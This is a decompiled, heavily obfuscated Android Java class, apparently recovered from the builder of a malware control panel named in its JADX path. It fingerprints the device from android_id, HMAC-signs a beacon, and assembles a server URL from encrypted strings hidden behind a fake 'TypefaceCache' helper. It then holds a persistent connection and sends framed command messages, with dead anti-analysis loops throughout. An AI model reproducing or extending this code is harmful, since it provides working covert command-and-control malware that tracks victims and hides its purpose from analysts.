package v.s;

import android.content.Context;
import android.os.Process;
import android.provider.Settings;
import app.mobilex.plus.util.TypefaceCache;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.Charset;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class Mf1Og5l70Bn6TXFI7E {
    public static volatile Mf1Og5l70Bn6TXFI7E ibVTtJUNfrGYbW;
    public final Context dDIMxZXP1V8HdM;
    public J1m0XraSkScfWFMIlTC vekpFI4d1Nc4fakF;
    public final sp6apkX00TawY02qGY6r xDyLpEZyrcKVe0;
    public final AtomicBoolean w9sT1Swbhx3hs = new AtomicBoolean(false);
    public final ConcurrentHashMap JXn4Qf7zpnLjP5 = new ConcurrentHashMap();
    public final ExecutorService Ee8d2j4S9Vm5yGuR = Executors.newCachedThreadPool();

    static {
        TypefaceCache.obtain("001300640054009F00E9009700D300A90027007A005E0095");
    }

    public Mf1Og5l70Bn6TXFI7E(Context context) {
        this.dDIMxZXP1V8HdM = context;
        Vb7X6LE0p9sZh vb7X6LE0p9sZh = new Vb7X6LE0p9sZh();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        vb7X6LE0p9sZh.l1V0lQr6TbwNKqHfXNbb = yrMnf4fyLGfIJbMg8IbG.w9sT1Swbhx3hs("timeout", 15L, timeUnit);
        vb7X6LE0p9sZh.K7eEOBPYP9VIoHWTe = yrMnf4fyLGfIJbMg8IbG.w9sT1Swbhx3hs("timeout", 0L, timeUnit);
        vb7X6LE0p9sZh.EWUjsTERgdPbSw3NNlN = yrMnf4fyLGfIJbMg8IbG.w9sT1Swbhx3hs("interval", 25L, timeUnit);
        this.xDyLpEZyrcKVe0 = new sp6apkX00TawY02qGY6r(vb7X6LE0p9sZh);
    }

    private static /* synthetic */ void llpuo() {
    }

    public final void Ee8d2j4S9Vm5yGuR(int i) {
        byte[] bArrArray = ByteBuffer.allocate(5).order(ByteOrder.BIG_ENDIAN).put((byte) 2).putInt(i).array();
        J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = this.vekpFI4d1Nc4fakF;
        if (j1m0XraSkScfWFMIlTC != null) {
            j1m0XraSkScfWFMIlTC.ibVTtJUNfrGYbW(2, fadfsJa4iEdiwEC4Xm8.ibVTtJUNfrGYbW(bArrArray));
        }
    }

    public final void JXn4Qf7zpnLjP5(String str, int i) {
        List listJdOQeRk37T35X5xKW1P = VnDsNIgXNCQywv8lGh.jdOQeRk37T35X5xKW1P(str.getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM), 255);
        int size = listJdOQeRk37T35X5xKW1P.size();
        byte[] bArr = new byte[size];
        Iterator it = listJdOQeRk37T35X5xKW1P.iterator();
        int i2 = 0;
        while (it.hasNext()) {
            bArr[i2] = ((Number) it.next()).byteValue();
            i2++;
        }
        byte[] bArrArray = ByteBuffer.allocate(size + 7).order(ByteOrder.BIG_ENDIAN).put((byte) 3).putInt(i).putShort((short) size).put(bArr).array();
        J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = this.vekpFI4d1Nc4fakF;
        if (j1m0XraSkScfWFMIlTC != null) {
            j1m0XraSkScfWFMIlTC.ibVTtJUNfrGYbW(2, fadfsJa4iEdiwEC4Xm8.ibVTtJUNfrGYbW(bArrArray));
        }
    }

    public final void dDIMxZXP1V8HdM() {
        for (bYTTp7VwXfKJ byttp7vwxfkj : this.JXn4Qf7zpnLjP5.values()) {
            byttp7vwxfkj.JXn4Qf7zpnLjP5 = false;
            try {
                byttp7vwxfkj.dDIMxZXP1V8HdM.close();
            } catch (Exception unused) {
            }
        }
        this.JXn4Qf7zpnLjP5.clear();
    }

    public final void vekpFI4d1Nc4fakF(int i) {
        byte[] bArrArray = ByteBuffer.allocate(5).order(ByteOrder.BIG_ENDIAN).put((byte) 5).putInt(i).array();
        J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = this.vekpFI4d1Nc4fakF;
        if (j1m0XraSkScfWFMIlTC != null) {
            j1m0XraSkScfWFMIlTC.ibVTtJUNfrGYbW(2, fadfsJa4iEdiwEC4Xm8.ibVTtJUNfrGYbW(bArrArray));
        }
    }

    /* JADX WARN: Unreachable blocks removed: 3, instructions: 5 */
    public final void w9sT1Swbhx3hs() {
        String strGmNWMfvn6zlEj;
        String strGwqvW1YsHBmGtO8bW7F;
        if (this.w9sT1Swbhx3hs.getAndSet(true)) {
            return;
        }
        Context context = this.dDIMxZXP1V8HdM;
        try {
            ktukzhfmAkOuMU ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
            strGmNWMfvn6zlEj = ktukzhfmAkOuMU.gmNWMfvn6zlEj(context);
        } catch (Exception unused) {
            String string = Settings.Secure.getString(context.getContentResolver(), "android_id");
            if (string == null) {
                string = TypefaceCache.obtain("003600780050008900FF00A800DC");
            }
            String packageName = context.getPackageName();
            if (packageName == null) {
                packageName = "";
            }
            long j = -3750763034362895579L;
            for (byte b : Y9mRyRdkl5FOcwb66V6.ibVTtJUNfrGYbW(string, packageName).getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM)) {
                j = (j ^ ((long) b)) * 1099511628211L;
            }
            strGmNWMfvn6zlEj = String.format("%016x", Arrays.copyOf(new Object[]{Long.valueOf(j)}, 1));
        }
        int iCurrentTimeMillis = (int) (System.currentTimeMillis() / ((long) 1000));
        String strDDIMxZXP1V8HdM = KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(64);
        Mac mac = Mac.getInstance(TypefaceCache.obtain("000B007B005A008400C3009700F300F500760020"));
        Charset charset = N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM;
        mac.init(new SecretKeySpec(strDDIMxZXP1V8HdM.getBytes(charset), TypefaceCache.obtain("000B007B005A008400C3009700F300F500760020")));
        String strKV57Z6oavcB595B8Dy8Z = KgSM0TsKUpCiuePB.KV57Z6oavcB595B8Dy8Z(VnDsNIgXNCQywv8lGh.MSGkxvPxRYNqC(mac.doFinal((strGmNWMfvn6zlEj + ":" + iCurrentTimeMillis).getBytes(charset)), ofxQWGnngPxGI3OtvQn.pyu8ovAipBTLYAiKab), 32);
        String str = KV57Z6oavcB595B8Dy8Z.w9sT1Swbhx3hs;
        if (BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(str)) {
            strGwqvW1YsHBmGtO8bW7F = KgSM0TsKUpCiuePB.gwqvW1YsHBmGtO8bW7F(BS2kx9eAoOyDiNGAFlFk.MSGkxvPxRYNqC(BS2kx9eAoOyDiNGAFlFk.MSGkxvPxRYNqC(KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(58), TypefaceCache.obtain("002B0062004F009700E300E5009D00E8"), TypefaceCache.obtain("00340065004800DD00BF00F0")), TypefaceCache.obtain("002B0062004F009700AA00F0009D"), TypefaceCache.obtain("00340065000100C800BF")), '/');
            if (!KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(strGwqvW1YsHBmGtO8bW7F, TypefaceCache.obtain("0020007A0054009200F400BE00C200AE006E0065005E009500E600B600D100A2"), false)) {
            }
        } else {
            strGwqvW1YsHBmGtO8bW7F = KgSM0TsKUpCiuePB.gwqvW1YsHBmGtO8bW7F(BS2kx9eAoOyDiNGAFlFk.MSGkxvPxRYNqC(BS2kx9eAoOyDiNGAFlFk.MSGkxvPxRYNqC(str, TypefaceCache.obtain("002B0062004F009700E300E5009D00E8"), TypefaceCache.obtain("00340065004800DD00BF00F0")), TypefaceCache.obtain("002B0062004F009700AA00F0009D"), TypefaceCache.obtain("00340065000100C800BF")), '/');
        }
        String str2 = strGwqvW1YsHBmGtO8bW7F + TypefaceCache.obtain("006C00660049008800E800A6009D") + strGmNWMfvn6zlEj + TypefaceCache.obtain("007C00620054008C00F500B1008F") + strKV57Z6oavcB595B8Dy8Z + TypefaceCache.obtain("00650062004800DA") + iCurrentTimeMillis;
        while (Process.myPid() < -999) {
            Runtime.getRuntime().totalMemory();
        }
        TypefaceCache.obtain("000000790055008900F500BC00C600AE002D0071001B009300FF00FF00C200B5002C006E004200C700E200BA00DE00A6003A002C001B");
        KgSM0TsKUpCiuePB.KV57Z6oavcB595B8Dy8Z(strGwqvW1YsHBmGtO8bW7F, 30);
        int i = (-1) + 3;
        fUH025aw0Rgl fuh025aw0rgl = new fUH025aw0Rgl(i);
        fuh025aw0rgl.D5P1xCAyuvgF(str2);
        this.vekpFI4d1Nc4fakF = this.xDyLpEZyrcKVe0.w9sT1Swbhx3hs(fuh025aw0rgl.dDIMxZXP1V8HdM(), new XxXBSmiig14HgdAKPhi8(i, this));
    }

    public final void xDyLpEZyrcKVe0(byte[] bArr, int i) {
        byte[] bArrArray = ByteBuffer.allocate(bArr.length + 5).order(ByteOrder.BIG_ENDIAN).put((byte) 4).putInt(i).put(bArr).array();
        J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = this.vekpFI4d1Nc4fakF;
        if (j1m0XraSkScfWFMIlTC != null) {
            j1m0XraSkScfWFMIlTC.ibVTtJUNfrGYbW((-80) + 82, fadfsJa4iEdiwEC4Xm8.ibVTtJUNfrGYbW(bArrArray));
        }
    }
}
